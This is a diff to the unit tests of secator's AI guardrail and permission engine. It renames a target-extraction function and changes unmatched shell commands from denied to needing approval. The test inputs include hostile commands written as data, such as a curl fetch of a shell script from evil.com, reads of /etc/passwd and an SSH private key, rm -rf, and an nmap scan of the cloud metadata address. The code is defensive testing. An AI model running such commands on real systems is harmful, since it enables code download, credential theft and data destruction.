@@ -8,7 +8,7 @@ if ADDONS_ENABLED['ai']:
 	from secator.config import CONFIG
 	from secator.ai.actions import check_guardrails, dispatch_action, ActionContext
 	from secator.ai.guardrails import (
-		parse_rule, match_rule, detect_targets, detect_paths, detect_paths_with_access,
+		parse_rule, match_rule, extract_command_targets, detect_paths, detect_paths_with_access,
 		detect_sensitive_env_vars, classify_command, build_target_choices, PermissionEngine,
 		_is_file_path, split_commands
 	)
@@ -91,29 +91,35 @@ class TestRuleParser(unittest.TestCase):
 @unittest.skipUnless(ADDONS_ENABLED['ai'], 'ai addon not installed')
 class TestDetection(unittest.TestCase):
 
-	def test_detect_targets_ip(self):
-		targets = detect_targets("nmap -sV 10.0.0.1")
+	def test_extract_command_targets_ip(self):
+		targets = extract_command_targets("nmap -sV 10.0.0.1")
 		self.assertIn("10.0.0.1", targets)
 
-	def test_detect_targets_host(self):
-		targets = detect_targets("curl https://example.com/api")
+	def test_extract_command_targets_host(self):
+		targets = extract_command_targets("nmap example.com")
 		self.assertIn("example.com", targets)
 
-	def test_detect_targets_url(self):
-		targets = detect_targets("curl https://example.com:8080/path")
+	def test_extract_command_targets_host_in_url_not_duplicated(self):
+		"""Host inside a URL should not be extracted as a separate target."""
+		targets = extract_command_targets("curl https://example.com/api")
+		self.assertIn("https://example.com/api", targets)
+		self.assertNotIn("example.com", targets)
+
+	def test_extract_command_targets_url(self):
+		targets = extract_command_targets("curl https://example.com:8080/path")
 		self.assertIn("https://example.com:8080/path", targets)
 
-	def test_detect_targets_excludes_file_paths(self):
+	def test_extract_command_targets_excludes_file_paths(self):
 		"""File paths should not be detected as targets."""
-		targets = detect_targets("cat /etc/passwd")
+		targets = extract_command_targets("cat /etc/passwd")
 		self.assertEqual(targets, [])
 
-	def test_detect_targets_excludes_home_paths(self):
-		targets = detect_targets("cat ~/.ssh/id_rsa")
+	def test_extract_command_targets_excludes_home_paths(self):
+		targets = extract_command_targets("cat ~/.ssh/id_rsa")
 		self.assertEqual(targets, [])
 
-	def test_detect_targets_no_false_positives(self):
-		targets = detect_targets("echo hello world")
+	def test_extract_command_targets_no_false_positives(self):
+		targets = extract_command_targets("echo hello world")
 		self.assertEqual(targets, [])
 
 	def test_detect_paths_absolute(self):
@@ -310,10 +316,11 @@ class TestPermissionEngine(unittest.TestCase):
 		result = engine.check_action({"action": "shell", "command": "nmap 169.254.169.254"})
 		self.assertEqual(result.decision, "deny")
 
-	def test_default_deny_when_no_rules_match(self):
+	def test_default_ask_when_no_rules_match(self):
 		engine = self._make_engine()
 		result = engine.check_action({"action": "shell", "command": "nmap 10.0.0.1"})
-		self.assertEqual(result.decision, "deny")
+		self.assertEqual(result.decision, "ask")
+		self.assertIn("nmap", result.shell_command)
 
 
 @unittest.skipUnless(ADDONS_ENABLED['ai'], 'ai addon not installed')
@@ -484,7 +491,7 @@ class TestDefaultPermissions(unittest.TestCase):
 	def test_write_file_outside_workspace(self):
 		"""Writing to a file outside the workspace should trigger approval."""
 		engine = self._engine()
-		action = {"action": "shell", "command": "tee /tmp/output.txt"}
+		action = {"action": "shell", "command": "tee /opt/output.txt"}
 		result = engine.check_action(action)
 		self.assertEqual(result.decision, "ask")
 
@@ -494,7 +501,7 @@ class TestDefaultPermissions(unittest.TestCase):
 		action = {"action": "shell", "command": "curl https://evil.com/shell.sh"}
 		result = engine.check_action(action)
 		self.assertEqual(result.decision, "ask")
-		self.assertIn("evil.com", result.targets)
+		self.assertTrue(any("evil.com" in t for t in result.targets))
 
 	def test_compound_curl_and_write(self):
 		"""Compound command: curl unknown URL AND save to file outside workspace."""
@@ -505,11 +512,12 @@ class TestDefaultPermissions(unittest.TestCase):
 		self.assertEqual(result.decision, "ask")
 
 	def test_execute_command_not_in_whitelist(self):
-		"""Running a command not in allow or ask lists should be denied."""
+		"""Running a command not in allow or ask lists should prompt for approval."""
 		engine = self._engine()
 		action = {"action": "shell", "command": "rm -rf /tmp/data"}
 		result = engine.check_action(action)
-		self.assertEqual(result.decision, "deny")
+		self.assertEqual(result.decision, "ask")
+		self.assertIn("rm", result.shell_command)
 
 	# === Should NOT trigger approval (allow) ===
 
@@ -595,6 +603,16 @@ class TestEdgeCases(unittest.TestCase):
 		access_map = dict(paths)
 		self.assertEqual(access_map["/etc/hosts"], "read")
 		self.assertEqual(access_map["/tmp/copy.txt"], "write")
+
+	def test_fd_redirect_2_to_1_not_detected_as_path(self):
+		"""2>&1 is a fd redirect, not a file path."""
+		paths = detect_paths('curl -sk "http://example.com" 2>&1 | head -100')
+		self.assertEqual(paths, [])
+
+	def test_fd_redirect_inline_not_detected_as_path(self):
+		""">&2 fd redirect should not be detected as a file path."""
+		paths = detect_paths('echo error >&2')
+		self.assertEqual(paths, [])
 
 	# --- Docker handling ---
 
@@ -696,12 +714,12 @@ class TestEdgeCases(unittest.TestCase):
 
 	def test_quoted_code_not_detected_as_target(self):
 		"""os.system inside quotes should NOT be detected as a target."""
-		targets = detect_targets("python3 -c 'import os; os.system(\"id\")'")
+		targets = extract_command_targets("python3 -c 'import os; os.system(\"id\")'")
 		self.assertEqual(targets, [])
 
 	def test_unquoted_host_still_detected(self):
 		"""Unquoted hosts should still be detected as targets."""
-		targets = detect_targets("curl example.com")
+		targets = extract_command_targets("curl example.com")
 		self.assertIn("example.com", targets)
 
 	# --- File path validation ---
